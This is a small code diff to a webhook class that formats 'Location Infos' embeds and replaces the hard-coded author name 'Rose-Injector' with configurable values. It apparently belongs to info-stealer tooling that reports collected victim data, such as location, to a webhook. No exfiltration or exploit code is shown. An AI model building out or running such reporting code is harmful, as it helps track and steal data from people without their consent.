@@ -11,12 +11,12 @@ class WebhookX():
     def locations_webhook(self, dictx):
         embed = Embed(
             description='Location Infos:',
-            color=0x5CDBF0,
+            color=cc.get_color(),
             timestamp='now'  # sets the timestamp to current time
         )
 
 
-        embed.set_author(name='Rose-Injector', icon_url=cc.get_avatar())
+        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
         embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
         
         for j in dictx:
